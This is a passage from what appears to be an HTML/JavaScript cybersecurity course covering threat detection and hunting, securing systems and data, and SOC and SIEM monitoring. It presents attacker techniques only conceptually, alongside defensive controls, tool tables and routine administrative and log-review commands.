                  <li>“Adversaries may use WMI for lateral movement.”</li>
                  <li>“Ransomware may delete shadow copies before encryption.”</li>
                  <li>“Attackers may use DNS tunneling for C2.”</li>
                  <li>“Insider threats may exfiltrate data via cloud storage.”</li>
                  <li>“Malware may persist via registry Run keys.”</li>
                </ul>

                <h4 class="sub-h">Data Sources for Hunting</h4>
                <ul class="content-list">
                  <li><strong>Endpoint:</strong> Sysmon, Windows Event Logs, EDR telemetry, osquery.</li>
                  <li><strong>Network:</strong> NetFlow, DNS logs, HTTP logs, proxy logs, PCAP.</li>
                  <li><strong>Cloud:</strong> CloudTrail, Azure Activity Log, GCP Audit Logs.</li>
                  <li><strong>Identity:</strong> Active Directory, Azure AD, Okta logs.</li>
                  <li><strong>Threat Intelligence:</strong> MISP, AlienVault OTX, VirusTotal.</li>
                </ul>

                <h4 class="sub-h">MITRE ATT&CK Framework</h4>
                <p>MITRE ATT&CK is a knowledge base of adversary tactics, techniques, and procedures based on real-world observations. It is used to map detection coverage, prioritize hunting efforts, understand adversary behavior, and improve defenses.</p>
                <p><strong>Tactics (the “why”):</strong> Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact.</p>
                <p><strong>Techniques (the “how”):</strong> Phishing, PowerShell, Scheduled Task, Registry Run Keys, WMI, SMB, DNS, etc.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Attack Vectors (Evasion)</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">How Attackers Evade Detection</span>
                    <ul>
                      <li><strong>Living Off the Land:</strong> Using legitimate tools (PowerShell, WMI, PsExec) to blend in.</li>
                      <li><strong>Fileless Malware:</strong> Running in memory only, not writing to disk.</li>
                      <li><strong>Encrypted C2:</strong> Using HTTPS, DNS tunneling, or custom protocols.</li>
                      <li><strong>Domain Generation Algorithms (DGA):</strong> Generating many domains to avoid blocking.</li>
                      <li><strong>Fast Flux:</strong> Rapidly changing DNS records.</li>
                      <li><strong>Process Injection:</strong> Hiding in legitimate processes.</li>
                      <li><strong>Masquerading:</strong> Using legitimate file names and paths.</li>
                      <li><strong>Timestomping:</strong> Modifying file timestamps.</li>
                      <li><strong>Log Tampering:</strong> Deleting or altering logs.</li>
                      <li><strong>Anti-Forensics:</strong> Using tools to wipe traces.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Common Attack Techniques to Hunt</span>
                    <ul>
                      <li><strong>Initial Access:</strong> Phishing, exploit public-facing app, valid accounts.</li>
                      <li><strong>Execution:</strong> PowerShell, cmd, WMI, scheduled tasks.</li>
                      <li><strong>Persistence:</strong> Registry Run keys, startup folder, services, scheduled tasks.</li>
                      <li><strong>Privilege Escalation:</strong> UAC bypass, token manipulation, exploits.</li>
                      <li><strong>Defense Evasion:</strong> Obfuscation, masquerading, rootkits.</li>
                      <li><strong>Credential Access:</strong> Mimikatz, keylogging, credential dumping.</li>
                      <li><strong>Discovery:</strong> Network scanning, account discovery, system info.</li>
                      <li><strong>Lateral Movement:</strong> SMB, RDP, WMI, PsExec, Pass-the-Hash.</li>
                      <li><strong>Collection:</strong> Screenshots, clipboard, keylogging, email collection.</li>
                      <li><strong>Command and Control:</strong> HTTP, HTTPS, DNS, custom protocols.</li>
                      <li><strong>Exfiltration:</strong> DNS, HTTP, cloud storage, USB.</li>
                      <li><strong>Impact:</strong> Ransomware, data destruction, defacement.</li>
                    </ul>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Defensive Controls</h3>

                <h4 class="sub-h">Building a Detection and Hunting Program</h4>
                <ul class="content-list">
                  <li>Establish Baselines: Know what normal looks like.</li>
                  <li>Centralize Logging: Aggregate logs into a SIEM.</li>
                  <li>Deploy Sensors: EDR, NDR, IDS/IPS, network taps.</li>
                  <li>Implement Detection Rules: Use Sigma, YARA, Snort, Suricata.</li>
                  <li>Map to MITRE ATT&CK: Identify coverage gaps.</li>
                  <li>Conduct Regular Hunts: Schedule proactive hunts.</li>
                  <li>Automate Response: Use SOAR for playbooks.</li>
                  <li>Measure and Improve: Track metrics (MTTD, MTTR).</li>
                </ul>

                <h4 class="sub-h">Detection Engineering Best Practices</h4>
                <ul class="content-list">
                  <li>Use Sigma for vendor-agnostic detection rules.</li>
                  <li>Use YARA for file and memory scanning.</li>
                  <li>Use Snort/Suricata for network detection.</li>
                  <li>Test rules with Atomic Red Team.</li>
                  <li>Reduce false positives through tuning.</li>
                  <li>Document detection logic.</li>
                  <li>Version control detection rules.</li>
                  <li>Continuously update based on threat intelligence.</li>
                </ul>

                <h4 class="sub-h">Threat Hunting Best Practices</h4>
                <ul class="content-list">
                  <li>Start with a hypothesis.</li>
                  <li>Use structured frameworks (MITRE ATT&CK, Pyramid of Pain).</li>
                  <li>Focus on TTPs, not just IOCs.</li>
                  <li>Use data science and analytics.</li>
                  <li>Collaborate with incident response and threat intelligence.</li>
                  <li>Document findings and update detections.</li>
                  <li>Automate repetitive tasks.</li>
                  <li>Measure hunt success.</li>
                </ul>

                <h4 class="sub-h">Incident Response Integration</h4>
                <ul class="content-list">
                  <li>Detection and hunting feed into incident response.</li>
                  <li>IR playbooks should include detection and hunting steps.</li>
                  <li>Post-incident reviews should update detections and hunting hypotheses.</li>
                  <li>Lessons learned should improve the entire program.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Tools &amp; Commands</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>MITRE ATT&CK</span><span>Adversary tactics and techniques</span></div>
                  <div class="tool-row"><span>Sigma</span><span>Generic detection rules</span></div>
                  <div class="tool-row"><span>YARA</span><span>Pattern matching for malware</span></div>
                  <div class="tool-row"><span>Snort</span><span>IDS/IPS</span></div>
                  <div class="tool-row"><span>Suricata</span><span>IDS/IPS</span></div>
                  <div class="tool-row"><span>Zeek</span><span>Network analysis framework</span></div>
                  <div class="tool-row"><span>Sysmon</span><span>Windows system monitoring</span></div>
                  <div class="tool-row"><span>osquery</span><span>SQL-based endpoint visibility</span></div>
                  <div class="tool-row"><span>Velociraptor</span><span>Endpoint visibility and hunting</span></div>
                  <div class="tool-row"><span>HELK</span><span>Hunting ELK stack</span></div>
                  <div class="tool-row"><span>Wazuh</span><span>SIEM and HIDS</span></div>
                  <div class="tool-row"><span>Splunk</span><span>SIEM</span></div>
                  <div class="tool-row"><span>ELK Stack</span><span>SIEM</span></div>
                  <div class="tool-row"><span>MISP</span><span>Threat intelligence platform</span></div>
                  <div class="tool-row"><span>AlienVault OTX</span><span>Threat intelligence</span></div>
                  <div class="tool-row"><span>VirusTotal</span><span>File and URL scanning</span></div>
                  <div class="tool-row"><span>Atomic Red Team</span><span>Detection testing</span></div>
                  <div class="tool-row"><span>TheHive</span><span>Incident response platform</span></div>
                  <div class="tool-row"><span>Shuffle</span><span>SOAR</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>Detection &amp; Hunting Commands</span></div>
                  <pre><code># View successful logons (Windows)
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624}

# View failed logons (Windows)
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4625}

# List PowerShell processes
Get-Process | Where-Object {$_.Name -eq "powershell"}

# View process command lines
Get-CimInstance Win32_Process | Select-Object Name, CommandLine

# Query process creation events
wevtutil qe Security /q:"*[System[(EventID=4688)]]"

# View audit policies
auditpol /get /category:*

# Capture network traffic
tcpdump -i eth0 -w capture.pcap

# Run Zeek
zeek -i eth0

# Run Suricata
suricata -i eth0 -c /etc/suricata/suricata.yaml

# Convert Sigma rule to Splunk query
sigma convert -t splunk rule.yml</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Threat detection identifies malicious activity using logs, alerts, and analytics.</li>
                  <li>Threat hunting proactively searches for hidden threats using hypotheses.</li>
                  <li>Detection sources: network, endpoint, application, cloud, identity.</li>
                  <li>Detection techniques: signature, anomaly, heuristic, behavioral, ML.</li>
                  <li>IOCs and IOAs are key indicators.</li>
                  <li>MITRE ATT&CK provides a framework for mapping adversary behavior.</li>
                  <li>Threat hunting loop: hypothesis, investigation, discovery, response, improvement.</li>
                  <li>Attackers evade detection using living off the land, fileless malware, encrypted C2.</li>
                  <li>Defenses: centralized logging, SIEM, EDR, NDR, detection engineering, regular hunts, automation.</li>
                  <li>Tools: Sigma, YARA, Snort, Suricata, Zeek, Sysmon, osquery, Velociraptor, MISP, TheHive.</li>
                  <li>Threat detection and hunting are essential for proactive security and incident response.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">9. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://attack.mitre.org/" target="_blank" rel="noopener">MITRE ATT&CK — Adversary tactics and techniques</a>
                  <a href="https://github.com/SigmaHQ/sigma" target="_blank" rel="noopener">Sigma — Generic detection rules</a>
                  <a href="https://virustotal.github.io/yara/" target="_blank" rel="noopener">YARA — Pattern matching for malware</a>
                  <a href="https://atomicredteam.io/" target="_blank" rel="noopener">Atomic Red Team — Detection testing</a>
                  <a href="https://velociraptor.app/" target="_blank" rel="noopener">Velociraptor — Endpoint visibility and hunting</a>
                </div>
              </section>
            ` },
                    { id: "5.2", title: "Securing Systems & Data", pages: "501-516", read: 20,
            build: "Harden a Linux server using CIS benchmarks and implement full-disk encryption.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>Securing Systems and Data</strong> refers to the comprehensive set of policies, procedures, technologies, and controls implemented to protect computing systems, applications, networks, and data from unauthorized access, modification, disclosure, disruption, or destruction. It encompasses preventive, detective, and corrective measures across physical, technical, and administrative domains. The goal is to ensure the confidentiality, integrity, and availability (CIA Triad) of information assets throughout their lifecycle.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenario</h3>
                <p>A financial institution implements a layered security strategy:</p>
                <ul class="content-list">
                  <li>Customer data is encrypted at rest using AES-256 and in transit using TLS 1.3.</li>
                  <li>Employee passwords are hashed with Argon2id, salted, and peppered.</li>
                  <li>Access to core banking systems requires MFA (hardware token + biometric).</li>
                  <li>Firewalls segment the network into DMZ, internal, and management zones.</li>
                  <li>Endpoints run EDR with real-time monitoring and automatic patching.</li>
                  <li>Backups are performed daily, encrypted, and stored offline.</li>
                  <li>Data loss prevention (DLP) monitors and blocks unauthorized exfiltration.</li>
                  <li>Regular security awareness training and phishing simulations are conducted.</li>
                </ul>
                <p>When an attacker attempts to breach the network, multiple controls detect and block the intrusion, and the incident response team quickly contains and remediates any residual threat.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Deep Explanation</h3>

                <figure class="content-figure">
                  <img src="./img/securing-systems-data.png" alt="Defense-in-depth layers — encryption, MFA, firewalls, endpoint hardening, patching, backups, DLP, and training" />
                  <figcaption>Figure 5.2 — Securing systems and data requires a layered, defense-in-depth approach.</figcaption>
                </figure>

                <h4 class="sub-h">Encryption</h4>
                <ul class="content-list">
                  <li><strong>At Rest:</strong> Full-disk encryption (BitLocker, LUKS, FileVault), database encryption (TDE, column-level), file encryption (VeraCrypt). Key management: HSMs, key vaults, rotation policies.</li>
                  <li><strong>In Transit:</strong> TLS 1.2/1.3 for web traffic, IPsec or WireGuard for VPNs, SSH for remote administration, SFTP instead of FTP, S/MIME or PGP for email.</li>
                </ul>

                <h4 class="sub-h">Password Security</h4>
                <ul class="content-list">
                  <li><strong>Hashing:</strong> Use Argon2id, scrypt, or bcrypt with high cost factors.</li>
                  <li><strong>Salting:</strong> Unique random salt per password (16+ bytes).</li>
                  <li><strong>Peppering:</strong> Secret value stored outside the database (HSM, secrets manager).</li>
                  <li><strong>Policies:</strong> Minimum 12 characters, passphrases encouraged, check against breached lists, account lockout after 5–10 failures.</li>
                  <li><strong>Password Managers:</strong> Enterprise-wide deployment for generating and storing unique credentials.</li>
                  <li><strong>MFA:</strong> Enforce everywhere, especially for privileged accounts.</li>
                </ul>

                <h4 class="sub-h">Multi-Factor Authentication (MFA)</h4>
                <ul class="content-list">
                  <li>Factors: something you know, have, are, somewhere you are, something you do.</li>
                  <li>Prefer phishing-resistant MFA: FIDO2/WebAuthn security keys.</li>
                  <li>Avoid SMS-based OTP where possible (SIM swapping risk).</li>
                  <li>Use authenticator apps (TOTP) or push notifications with number matching.</li>
                  <li>Implement adaptive MFA based on risk (location, device, behavior).</li>
                </ul>

                <h4 class="sub-h">Firewall Configuration</h4>
                <ul class="content-list">
                  <li><strong>Default Deny:</strong> Block all traffic, allow only explicitly permitted.</li>
                  <li><strong>Least Privilege:</strong> Open only necessary ports and protocols.</li>
                  <li><strong>Segmentation:</strong> DMZ, internal, management VLANs.</li>
                  <li><strong>Ingress and Egress Filtering:</strong> Control both inbound and outbound traffic.</li>
                  <li><strong>Stateful Inspection:</strong> Track connection state.</li>
                  <li><strong>Application Layer Filtering:</strong> NGFW, WAF for web apps.</li>
                  <li><strong>Regular Rule Audits:</strong> Remove obsolete rules.</li>
                  <li><strong>Logging and Monitoring:</strong> Send logs to SIEM.</li>
                </ul>

                <h4 class="sub-h">Endpoint Hardening</h4>
                <ul class="content-list">
                  <li>Disable unnecessary services and ports.</li>
                  <li>Remove or disable default accounts.</li>
                  <li>Apply least privilege to user accounts.</li>
                  <li>Enable host-based firewall and antivirus/EDR.</li>
                  <li>Use application whitelisting.</li>
                  <li>Enable full-disk encryption.</li>
                  <li>Configure screen lock and timeout.</li>
                  <li>Disable autorun for USB devices.</li>
                  <li>Keep OS and applications patched.</li>
                  <li>Use secure boot and TPM.</li>
                </ul>

                <h4 class="sub-h">Patch Management</h4>
                <ul class="content-list">
                  <li>Inventory all hardware and software.</li>
                  <li>Prioritize patches based on criticality and exploitability.</li>
                  <li>Test patches in a staging environment.</li>
                  <li>Deploy patches promptly (within 14–30 days for critical).</li>
                  <li>Use automated patch management tools.</li>
                  <li>Verify patch installation.</li>
                  <li>Maintain a rollback plan.</li>
                </ul>

                <h4 class="sub-h">Backup and Recovery</h4>
                <ul class="content-list">
                  <li><strong>3-2-1 Rule:</strong> 3 copies, 2 different media, 1 offsite.</li>
                  <li><strong>Offline Backups:</strong> Immutable, air-gapped, or offline to prevent ransomware encryption.</li>
                  <li><strong>Regular Testing:</strong> Restore backups to verify integrity.</li>
                  <li><strong>Encryption:</strong> Encrypt backups at rest and in transit.</li>
                  <li><strong>Access Control:</strong> Limit who can access backups.</li>
                  <li><strong>Retention Policy:</strong> Comply with legal and regulatory requirements.</li>
                </ul>

                <h4 class="sub-h">Access Control</h4>
                <ul class="content-list">
                  <li><strong>Least Privilege:</strong> Users get only the access needed.</li>
                  <li><strong>Role-Based Access Control (RBAC):</strong> Access based on job roles.</li>
                  <li><strong>Attribute-Based Access Control (ABAC):</strong> Access based on attributes.</li>
                  <li><strong>Separation of Duties:</strong> No single person has complete control.</li>
                  <li><strong>Just-In-Time (JIT) Access:</strong> Temporary elevated access.</li>
                  <li><strong>Privileged Access Management (PAM):</strong> Secure, manage, and audit privileged accounts.</li>
                  <li><strong>Regular Access Reviews:</strong> Quarterly or semi-annual.</li>
                </ul>

                <h4 class="sub-h">Data Classification and DLP</h4>
                <ul class="content-list">
                  <li><strong>Classification:</strong> Public, Internal, Confidential, Restricted.</li>
                  <li><strong>Labeling:</strong> Apply labels to documents and emails.</li>
                  <li><strong>Handling Procedures:</strong> Based on classification.</li>
                  <li><strong>Data Loss Prevention (DLP):</strong> Monitor and block unauthorized exfiltration via email, web, USB, cloud.</li>
                  <li><strong>Encryption:</strong> Mandatory for confidential and restricted data.</li>
                  <li><strong>Retention and Disposal:</strong> Secure deletion, shredding, degaussing.</li>
                </ul>

                <h4 class="sub-h">Security Awareness Training</h4>
                <ul class="content-list">
                  <li>Regular training on phishing, social engineering, password hygiene, and incident reporting.</li>
                  <li>Simulated phishing campaigns.</li>
                  <li>Role-specific training for finance, HR, IT, and executives.</li>
                  <li>Measure effectiveness and improve.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Common Attack Vectors</span>
                    <ul>
                      <li><strong>Unpatched Systems:</strong> Exploit known vulnerabilities (EternalBlue, BlueKeep).</li>
                      <li><strong>Weak Passwords:</strong> Brute-force, dictionary, credential stuffing.</li>
                      <li><strong>Missing MFA:</strong> Credential theft leads to account takeover.</li>
                      <li><strong>Misconfigured Firewalls:</strong> Open ports, any-any rules.</li>
                      <li><strong>Unencrypted Data:</strong> Eavesdropping, data theft.</li>
                      <li><strong>Insecure Backups:</strong> Ransomware encrypts backups, preventing recovery.</li>
                      <li><strong>Excessive Privileges:</strong> Lateral movement, privilege escalation.</li>
                      <li><strong>Insider Threats:</strong> Data exfiltration by malicious or negligent employees.</li>
                      <li><strong>Phishing:</strong> Initial access, credential theft.</li>
                      <li><strong>Supply Chain Attacks:</strong> Compromised software updates.</li>
                    </ul>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Defensive Controls (Defense-in-Depth)</h3>
                <ul class="content-list">
                  <li><strong>Identify Assets:</strong> Inventory hardware, software, data.</li>
                  <li><strong>Classify Data:</strong> Apply appropriate controls.</li>
                  <li><strong>Harden Systems:</strong> Remove unnecessary services, patch, encrypt.</li>
                  <li><strong>Control Access:</strong> Least privilege, MFA, PAM.</li>
                  <li><strong>Encrypt Data:</strong> At rest and in transit.</li>
                  <li><strong>Segment Networks:</strong> Firewalls, VLANs, micro-segmentation.</li>
                  <li><strong>Monitor and Detect:</strong> SIEM, EDR, NDR, IDS/IPS.</li>
                  <li><strong>Backup and Recover:</strong> 3-2-1, offline, tested.</li>
                  <li><strong>Train Users:</strong> Awareness, phishing simulations.</li>
                  <li><strong>Incident Response:</strong> Plan, test, improve.</li>
                  <li><strong>Compliance:</strong> Meet regulatory requirements.</li>
                  <li><strong>Continuous Improvement:</strong> Regular audits, penetration testing, threat hunting.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Tools &amp; Resources</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>BitLocker</span><span>Windows full-disk encryption</span></div>
                  <div class="tool-row"><span>LUKS</span><span>Linux disk encryption</span></div>
                  <div class="tool-row"><span>VeraCrypt</span><span>Disk encryption</span></div>
                  <div class="tool-row"><span>OpenSSL</span><span>Encryption, TLS, certificates</span></div>
                  <div class="tool-row"><span>Argon2</span><span>Password hashing</span></div>
                  <div class="tool-row"><span>bcrypt</span><span>Password hashing</span></div>
                  <div class="tool-row"><span>YubiKey</span><span>Hardware MFA</span></div>
                  <div class="tool-row"><span>Duo Security</span><span>MFA platform</span></div>
                  <div class="tool-row"><span>pfSense</span><span>Firewall and VPN</span></div>
                  <div class="tool-row"><span>OPNsense</span><span>Firewall and VPN</span></div>
                  <div class="tool-row"><span>iptables</span><span>Linux firewall</span></div>
                  <div class="tool-row"><span>Windows Firewall</span><span>Host-based firewall</span></div>
                  <div class="tool-row"><span>CrowdStrike</span><span>EDR</span></div>
                  <div class="tool-row"><span>SentinelOne</span><span>EDR</span></div>
                  <div class="tool-row"><span>Microsoft Defender ATP</span><span>EDR</span></div>
                  <div class="tool-row"><span>Wazuh</span><span>SIEM and HIDS</span></div>
                  <div class="tool-row"><span>Splunk</span><span>SIEM</span></div>
                  <div class="tool-row"><span>ELK Stack</span><span>SIEM</span></div>
                  <div class="tool-row"><span>Veeam</span><span>Backup and recovery</span></div>
                  <div class="tool-row"><span>Acronis</span><span>Backup and recovery</span></div>
                  <div class="tool-row"><span>CyberArk</span><span>PAM</span></div>
                  <div class="tool-row"><span>HashiCorp Vault</span><span>Secrets management</span></div>
                  <div class="tool-row"><span>Microsoft Purview</span><span>DLP and data governance</span></div>
                  <div class="tool-row"><span>Symantec DLP</span><span>Data loss prevention</span></div>
                  <div class="tool-row"><span>KnowBe4</span><span>Security awareness training</span></div>
                  <div class="tool-row"><span>SANS Security Awareness</span><span>Training resources</span></div>
                  <div class="tool-row"><span>OWASP</span><span>Web security resources</span></div>
                  <div class="tool-row"><span>NIST Cybersecurity Framework</span><span>Framework</span></div>
                  <div class="tool-row"><span>CIS Controls</span><span>Security best practices</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>System &amp; Data Security Commands</span></div>
                  <pre><code># Check BitLocker status (Windows)
manage-bde -status

# Format LUKS partition (Linux)
cryptsetup luksFormat /dev/sda1

# AES-GCM encryption
openssl enc -aes-256-gcm -in plain.txt -out cipher.txt

# List firewall rules
iptables -L -n -v

# Windows firewall rules
netsh advfirewall firewall show rule name=all

# Check Wazuh agent status
systemctl status wazuh-agent

# Veeam CLI
veeamconfig

# Store secret in Vault
vault kv put secret/password value=mysecret</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Securing systems and data requires a layered, defense-in-depth approach.</li>
                  <li>Encryption protects data at rest and in transit.</li>
                  <li>Password security: strong hashing (Argon2id), salting, peppering, MFA.</li>
                  <li>Firewalls enforce network segmentation and least privilege.</li>
                  <li>Endpoint hardening reduces attack surface.</li>
                  <li>Patch management closes known vulnerabilities.</li>
                  <li>Backup and recovery ensure availability and resilience.</li>
                  <li>Access control: least privilege, RBAC, PAM, JIT.</li>
                  <li>Data classification and DLP prevent unauthorized exfiltration.</li>
                  <li>Security awareness training addresses the human element.</li>
                  <li>Tools: BitLocker, LUKS, VeraCrypt, OpenSSL, YubiKey, pfSense, CrowdStrike, Wazuh, Veeam, CyberArk, Vault.</li>
                  <li>Continuous monitoring, auditing, and improvement are essential.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.nist.gov/cyberframework" target="_blank" rel="noopener">NIST Cybersecurity Framework</a>
                  <a href="https://www.cisecurity.org/controls/" target="_blank" rel="noopener">CIS Controls — Security best practices</a>
                  <a href="https://www.veracrypt.fr/" target="_blank" rel="noopener">VeraCrypt — Disk encryption</a>
                  <a href="https://www.yubico.com/" target="_blank" rel="noopener">YubiKey — Hardware MFA</a>
                  <a href="https://www.vaultproject.io/" target="_blank" rel="noopener">HashiCorp Vault — Secrets management</a>
                </div>
              </section>
            ` },
                    { id: "5.3", title: "Monitoring, SOC & SIEM", pages: "517-534", read: 22,
            build: "Deploy a Wazuh SIEM and create a custom rule for failed logins.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>Monitoring</strong> is the continuous process of observing and analyzing the activity of systems, networks, applications, and users to detect anomalies, security incidents, performance issues, and policy violations. It involves collecting data from various sources, correlating events, and generating alerts for further investigation.</p>
                <p><strong>A Security Operations Center (SOC)</strong> is a centralized team, facility, and set of processes responsible for continuously monitoring, detecting, analyzing, and responding to cybersecurity incidents. The SOC is the heart of an organization’s defensive operations, combining people, processes, and technology to protect against threats.</p>
                <p><strong>SIEM (Security Information and Event Management)</strong> is a technology platform that aggregates, correlates, and analyzes log and event data from across an organization’s IT infrastructure. SIEM provides real-time monitoring, alerting, dashboards, and forensic analysis capabilities. It is a core tool used by SOC teams to detect and respond to security incidents.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenario</h3>
                <p>A multinational corporation operates a 24/7 SOC staffed by Tier 1, Tier 2, and Tier 3 analysts. The SOC uses a SIEM (e.g., Splunk) to collect logs from firewalls, endpoints, servers, cloud services, and identity providers.</p>
                <p>At 02:00, the SIEM generates an alert: a user account has logged in from two geographically impossible locations within five minutes. The Tier 1 analyst investigates, correlates with VPN logs, and determines that the account is likely compromised. The analyst escalates to Tier 2, who isolates the user’s endpoint, resets credentials, and revokes active sessions. The incident is documented, and the SOC updates detection rules to catch similar behavior in the future.</p>
                <p>In another scenario, a threat hunter in the SOC uses SIEM queries to search for PowerShell processes that download files from the internet. The hunter discovers a previously undetected backdoor on a server. Incident response is engaged, and the threat is removed before it can exfiltrate data.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Monitoring In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/monitoring-soc-siem.png" alt="SOC tiers, SIEM architecture, and monitoring sources — network, endpoint, application, identity, cloud" />
                  <figcaption>Figure 5.3 — SOC combines people, processes, and technology. SIEM aggregates and correlates logs from all sources.</figcaption>
                </figure>

                <h4 class="sub-h">What to Monitor</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Source</span><span>Examples</span><span>Security Value</span></div>
                  <div class="tool-row"><span>Network</span><span>Firewall logs, NetFlow, IDS/IPS, DNS logs, proxy logs</span><span>Detect scanning, C2, exfiltration</span></div>
                  <div class="tool-row"><span>Endpoint</span><span>Windows Event Logs, Sysmon, EDR, auditd</span><span>Detect malware, persistence, privilege escalation</span></div>
                  <div class="tool-row"><span>Application</span><span>Web server logs, database logs, API logs</span><span>Detect SQLi, XSS, brute force</span></div>
                  <div class="tool-row"><span>Identity</span><span>Active Directory, Azure AD, Okta, VPN</span><span>Detect credential abuse, impossible travel</span></div>
                  <div class="tool-row"><span>Cloud</span><span>AWS CloudTrail, Azure Activity Log, GCP Audit Logs</span><span>Detect misconfigurations, unauthorized access</span></div>
                  <div class="tool-row"><span>Physical</span><span>Badge access, CCTV</span><span>Detect tailgating, unauthorized entry</span></div>
                  <div class="tool-row"><span>Threat Intelligence</span><span>IOCs, TTPs, reputation feeds</span><span>Contextualize and prioritize alerts</span></div>
                </div>

                <h4 class="sub-h">Monitoring Techniques</h4>
                <ul class="content-list">
                  <li><strong>Signature-Based:</strong> Matches known patterns (IDS rules, antivirus signatures).</li>
                  <li><strong>Anomaly-Based:</strong> Detects deviations from baseline behavior.</li>
                  <li><strong>Behavioral:</strong> Observes sequences of actions (process chains, lateral movement).</li>
                  <li><strong>Heuristic:</strong> Uses rules and indicators to identify suspicious activity.</li>
                  <li><strong>Threat Intelligence-Driven:</strong> Uses external data to identify known threats.</li>
                  <li><strong>User and Entity Behavior Analytics (UEBA):</strong> Uses machine learning to detect insider threats and compromised accounts.</li>
                </ul>

                <h4 class="sub-h">Log Management</h4>
                <ul class="content-list">
                  <li><strong>Collection:</strong> Gather logs from all critical sources.</li>
                  <li><strong>Normalization:</strong> Convert logs to a common format (e.g., CEF, LEEF, JSON).</li>
                  <li><strong>Storage:</strong> Retain logs for compliance and forensic analysis (e.g., 90 days hot, 1 year cold).</li>
                  <li><strong>Correlation:</strong> Link events across sources to identify incidents.</li>
                  <li><strong>Retention:</strong> Meet legal and regulatory requirements (e.g., PCI DSS 1 year, HIPAA 6 years).</li>
                  <li><strong>Integrity:</strong> Protect logs from tampering (write-once storage, hashing).</li>
                </ul>

                <h4 class="sub-h">Alerting and Triage</h4>
                <ul class="content-list">
                  <li><strong>Alert Generation:</strong> SIEM rules trigger alerts based on correlation.</li>
                  <li><strong>Prioritization:</strong> Alerts are ranked by severity, confidence, and impact.</li>
                  <li><strong>Triage:</strong> Tier 1 analysts validate alerts, gather context, and escalate if needed.</li>
                  <li><strong>False Positive Reduction:</strong> Tune rules, use allowlists, and apply threat intelligence.</li>
                  <li><strong>Escalation:</strong> Tier 2/3 analysts perform deeper investigation and response.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. SOC In Depth</h3>

                <h4 class="sub-h">SOC Functions</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Function</span><span>Description</span></div>
                  <div class="tool-row"><span>Monitoring</span><span>24/7 observation of security events</span></div>
                  <div class="tool-row"><span>Detection</span><span>Identify malicious activity using SIEM, EDR, NDR</span></div>
                  <div class="tool-row"><span>Analysis</span><span>Investigate alerts and correlate data</span></div>
                  <div class="tool-row"><span>Response</span><span>Contain, eradicate, and recover from incidents</span></div>
                  <div class="tool-row"><span>Threat Hunting</span><span>Proactively search for hidden threats</span></div>
                  <div class="tool-row"><span>Threat Intelligence</span><span>Collect, analyze, and apply threat data</span></div>
                  <div class="tool-row"><span>Vulnerability Management</span><span>Identify and prioritize vulnerabilities</span></div>
                  <div class="tool-row"><span>Incident Response</span><span>Execute playbooks and coordinate response</span></div>
                  <div class="tool-row"><span>Reporting</span><span>Provide metrics and reports to management</span></div>
                  <div class="tool-row"><span>Compliance</span><span>Ensure logs and processes meet regulations</span></div>
                </div>

                <h4 class="sub-h">SOC Tiers</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tier</span><span>Role</span><span>Responsibilities</span></div>
                  <div class="tool-row"><span>Tier 1</span><span>Alert Triage</span><span>Monitor dashboards, validate alerts, escalate</span></div>
                  <div class="tool-row"><span>Tier 2</span><span>Incident Responder</span><span>Deep investigation, containment, remediation</span></div>
                  <div class="tool-row"><span>Tier 3</span><span>Threat Hunter / SME</span><span>Proactive hunting, advanced analysis, tool development</span></div>
                  <div class="tool-row"><span>SOC Manager</span><span>Leadership</span><span>Manage operations, metrics, staffing, strategy</span></div>
                  <div class="tool-row"><span>Detection Engineer</span><span>Rule Development</span><span>Build, test, and tune detection rules</span></div>
                  <div class="tool-row"><span>Threat Intelligence Analyst</span><span>Intelligence</span><span>Collect and analyze threat data</span></div>
                </div>

                <h4 class="sub-h">SOC Models</h4>
                <ul class="content-list">
                  <li><strong>In-House SOC:</strong> Organization builds and operates its own SOC.</li>
                  <li><strong>Managed SOC (MSSP):</strong> Third-party provider monitors and responds.</li>
                  <li><strong>Hybrid SOC:</strong> Combination of in-house and managed services.</li>
                  <li><strong>Virtual SOC:</strong> Distributed team working remotely.</li>
